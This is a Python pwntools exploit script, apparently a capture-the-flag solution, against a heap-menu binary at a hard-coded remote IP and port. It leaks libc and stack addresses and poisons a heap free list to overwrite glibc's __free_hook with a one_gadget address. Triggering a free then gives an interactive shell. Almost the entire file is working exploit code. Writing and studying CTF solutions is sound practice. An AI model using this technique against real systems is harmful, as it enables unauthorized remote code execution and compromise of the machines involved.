#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '103.127.132.106', 9002

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# CREATE 
# TYPE 1 => STRING DUPLICATE OF RAW 63 BYTE
# TYPE 2 => ULONG
# TYPE 3 => FLOAT

# FREE
# TYPE 1 => FREE, NULLIFY
# ELSE => NULLIFY

# VIEW
# TYPE 1 => RAW
# TYPE 2 => LONG
# TYPE 3 => FLOAT

def create(idx, data):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', data)

    return read_address(idx)

def read_address(idx):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', b'2')
    
    io.recvuntil(b'data: ')
    return int(io.recvline().strip(), 10)

def set_address(idx, addr):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(addr).encode())

def read_raw(idx):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', b'1')

    io.recvuntil(b'data: ')
    return io.recvline().strip()

def free(idx):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', b'1')

def exploit():
    global io
    io = initialize()

    set_address(0, elf.got['puts'])
    libc.address = u64(read_raw(0).ljust(8, b'\x00')) - libc.symbols['puts']

    set_address(0, libc.sym['environ'])
    environ = u64(read_raw(0).ljust(8, b'\x00'))

    set_address(0, environ)
    stack = u64(read_raw(0).ljust(8, b'\x00')) - 0x2022e

    chunks = [0] * 7
    chunks[0] = create(0, b'A' * 62)

    heap_base = chunks[0] - 0x2f0
    pool = chunks[0] - 0x50

    free(0)
    set_address(6, pool)
    free(6)

    set_address(0, libc.sym['__free_hook'] - 0x38)
    chunks[1] = create(1, b'C' * 62)

    one_gadgets = [0xe699e, 0xe69a1, 0xe69a4, 0x10afa9]
    payload = b'F' * 0x38 + p64(libc.address + one_gadgets[1])
    chunks[2] = create(2, payload)

    # DELETE => trigger __free_hook
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', b'0')
    io.sendlineafter(b':', b'1')

    info('libc base: %#x', libc.address)
    info('stack: %#x', stack)
    info('__free_hook: %#x', libc.symbols['__free_hook'])
    info('heap base: %#x', heap_base)
    info('pool: %#x', pool)
    for i in range(len(chunks)):
        info('chunk[%d]: %#x', i, chunks[i])

    io.interactive()
    
if __name__ == '__main__':
    exploit()